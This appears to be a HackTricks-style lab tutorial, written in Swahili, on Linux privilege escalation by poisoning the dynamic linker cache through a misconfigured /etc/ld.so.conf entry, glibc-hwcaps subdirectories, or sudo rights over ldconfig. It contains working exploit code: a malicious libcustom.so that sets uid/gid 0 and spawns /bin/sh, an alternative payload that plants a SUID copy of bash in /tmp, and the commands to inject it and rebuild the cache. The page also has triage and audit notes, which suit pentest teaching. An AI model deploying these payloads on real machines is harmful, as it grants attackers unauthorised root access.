# mfano wa exploit ya privesc ya ld.so

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu ni labu inayolenga kuweka sumu kwenye **system linker cache kupitia `/etc/ld.so.conf` au `ldconfig`**. Kwa library injection inayokosekana, `RPATH`/`RUNPATH` zinazoweza kuandikwa, `LD_PRELOAD`, na matumizi mengine ya jumla mabaya ya SUID linker, angalia [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Andaa mazingira

Katika sehemu ifuatayo unaweza kupata code ya files tutakazotumia kuandaa mazingira

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Unda** faili hizo kwenye mashine yako katika folda hiyo hiyo
2. **Compile** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Nakili** `libcustom.so` kwenye `/usr/lib` na u-refresh cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compile** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kagua mazingira

Hakikisha kuwa _libcustom.so_ **inapakiwa** kutoka _/usr/lib_ na kwamba unaweza **ku-execute** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Amri muhimu za triage

Unaposhambulia target halisi, thibitisha **jina kamili la library** ambalo binary inahitaji, kile ambacho loader **inatatua kwa sasa**, na ni paths zipi zilizosanidiwa zinaweza kuandikwa bila kubadilisha live cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Tumia `ldd` tu kwenye executable **inayoaminika**. Baadhi ya implementations au ELF interpreters zisizo za kawaida zinaweza kuisababisha iendeshe code inayodhibitiwa na attacker; `objdump -p ./file | grep NEEDED` huorodhesha dependencies za moja kwa moja kwa usalama. Kwa target inayoaminika, kuendesha interpreter iliyogunduliwa kwa `--list` huonyesha resolution halisi.<sup>[[4]](#references)</sup>

Mambo kadhaa muhimu ya kuzingatia:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` kwa kawaida **haifanyi kazi** kwa sababu redirection hufanywa na shell yako ya sasa. Tumia
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` badala yake.
- Binaries zenye **SUID/privileged** huendeshwa katika **secure-execution mode**: `LD_LIBRARY_PATH`
hupuuzwa, huku `LD_PRELOAD` ikiwa na vizuizi (majina yenye slash
hupuuzwa, na ni libraries zilizo na setuid-mark katika directories za kawaida pekee zinazoweza
kupreloadiwa). Mara root anapoendesha `ldconfig`, directories zilizoorodheshwa katika
`/etc/ld.so.conf` zinaweza kuingia kwenye `/etc/ld.so.cache`, hivyo misconfiguration hii inaweza
bado kuathiri privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` pia hupuuzwa katika secure-execution mode isipokuwa `/etc/suid-debug` iwepo, hivyo kusanya trace yake kutoka kwenye run inayolingana isiyo ya SUID badala ya kutarajia output kutoka kwenye privileged execution.<sup>[[1]](#references)</sup>
- Kwenye glibc 2.33 na mpya zaidi, dynamic loader pia hutoa
`--list-diagnostics`, ambayo huchapisha loader diagnostics zinazosomeka na mashine pamoja na taarifa za built-in search-path wakati hijack haifanyi kazi kama ilivyotarajiwa.<sup>[[1]](#references)[[6]](#references)</sup>

### Vikwazo vya Cache na SONAME

`ldconfig` haihifadhi kila file ya kiholela katika directory iliyosanidiwa: huchunguza ELF headers, hutambua majina yanayolingana na `lib*.so*` au `ld-*.so*`, na hutegemea chain ya kawaida ya `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Kwa hivyo, injected object lazima iwe na target architecture/class, jina kamili la `DT_NEEDED` (kwa kawaida `DT_SONAME` yake), pamoja na symbols/versions zozote ambazo victim hu-resolve.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Tumia library maalum kwa target kama katika mfano huu. Kuficha SONAME ya kawaida kwa object isiyokamilika kunaweza kuvuruga kila process inayoi-resolve kabla ya target yenye privileges iliyokusudiwa kuanza.<sup>[[3]](#references)</sup>

## Exploit

Katika hali hii, tuchukulie kwamba administrator ameongeza entry yenye vulnerability kwenye
file iliyo chini ya `/etc/ld.so.conf.d/` ambayo inajumuishwa na
`/etc/ld.so.conf` ya mfumo.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Folda iliyo katika hatari ni _/home/ubuntu/lib_ (ambapo tuna ufikiaji wa kuandika).\
**Download na compile** code ifuatayo ndani ya path hiyo:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ikiwa unatarajia **root** (au akaunti nyingine yenye privileged) kutekeleza binary iliyo hatarini baadaye, kwa kawaida ni bora kuacha **root-owned artifact** badala ya kuanzisha interactive shell. Kwa mfano:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Kisha, baada ya utekelezaji wenye privileges kufanyika, unaweza kutumia `/tmp/rootbash -p`.

Sasa kwa kuwa **tumeunda library hasidi ya libcustom ndani ya** path **iliyosaniwa vibaya**, cache chaguo-msingi lazima ijengwe upya na uendeshaji wa **`ldconfig` wenye privileges** ambao umefaulu. Kuwasha upya mfumo husaidia tu pale ambapo mchakato wa ndani wa kuwasha mfumo huiendesha; vinginevyo subiri hatua ya administrator au tumia sheria isiyo salama ya sudo ikiwa inapatikana.<sup>[[2]](#references)</sup>

Baada ya hili kutokea, **kagua tena** mahali ambapo executable ya `sharedvuln` inapakia library ya `libcustom.so` kutoka:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kama unavyoona, **inapakia kutoka `/home/ubuntu/lib`** na ikiwa mtumiaji yeyote atakiendesha, shell itatekelezwa:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Kumbuka kwamba katika mfano huu hatujaongeza privileges, lakini kwa kurekebisha commands zinazotekelezwa na **kusubiri root au user mwingine mwenye privileges atekeleze vulnerable binary** tutaweza kuongeza privileges.

### `glibc-hwcaps` shadowing ya kisasa

Tangu glibc 2.33, loader inaweza kupendelea libraries zilizoboreshwa zilizo chini ya `glibc-hwcaps/<level>/` ndani ya **kila library search directory**. Kwa hiyo, kuangalia `/home/ubuntu/lib` pekee hakutoshi: subdirectory inayoweza kuandikwa na inayooana, kama `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, inaweza kufanya shadowing ya base library baada ya `ldconfig` kui-index, huku CPUs nyingine zikiendelea kutumia base object. Hii pia hutoa architecture-selective hijack ambayo inaweza kukosekana wakati validation inafanywa kwenye CPU tofauti.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Mwongozo wa sasa wa glibc hardening unapendekeza kuepuka SONAMEs zinazorudiwa, maeneo ya utafutaji yasiyo ya default, na objects zilizo katika subdirectories za `glibc-hwcaps`. Kwa mtazamo wa audit, tumia ukaguzi wa ownership na writeability kwa kujirudia kwenye directories zilizosanidiwa na vipengele vya njia ya parent zao.<sup>[[3]](#references)</sup>

### Misconfigurations nyingine - Same vuln

Katika mfano uliopita tulitengeneza misconfiguration ya kughushi ambapo administrator **aliweka folder isiyo na privileged ndani ya configuration file iliyo ndani ya `/etc/ld.so.conf.d/`**.\
Lakini kuna misconfigurations nyingine zinazoweza kusababisha vulnerability hiyo hiyo: ikiwa una **write permissions** katika **config file** iliyopakiwa, unaweza kuunda file katika directory ya `/etc/ld.so.conf.d/` inayoweza kuandikwa, au unaweza kuandika kwenye `/etc/ld.so.conf`, unaweza kusanidi na kutumia vulnerability hiyo hiyo.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Tuseme una sudo privileges juu ya `ldconfig`**.\
Unaweza kuonyesha `ldconfig` **configuration file ipi isomwe** kwa kutumia `-f`, kwa hiyo file inayotaja directories zinazodhibitiwa na attacker inaweza kuifanya `ldconfig` iongeze folders hizo kwenye cache.<sup>[[2]](#references)</sup>\
Kwa hiyo, hebu tuunde files na folders zinazohitajika ili kupakia "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sasa, kama ilivyoonyeshwa kwenye **previous exploit**, **unda library hasidi ndani ya `/tmp`**.\
Na mwishowe, hebu tupakie path na tuchunguze binary inapopakia library kutoka wapi:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kama unavyoona, ukiwa na ruhusa za sudo juu ya `ldconfig` unaweza kutumia vulnerability hiyo hiyo.** Maelezo ya options ni muhimu wakati wa kutathmini sheria ya sudo yenye vikwazo: `-f` huchagua configuration nyingine lakini bado huunda upya `/etc/ld.so.cache`; `-C` huelekeza cache mahali pengine; `-N` huzuia kuunda upya cache; na `-X` huzuia masasisho ya links lakini **bado huunda upya cache isipokuwa itumike pamoja na `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Uimarishaji wa Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Uchunguzi wa Dynamic Linker (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
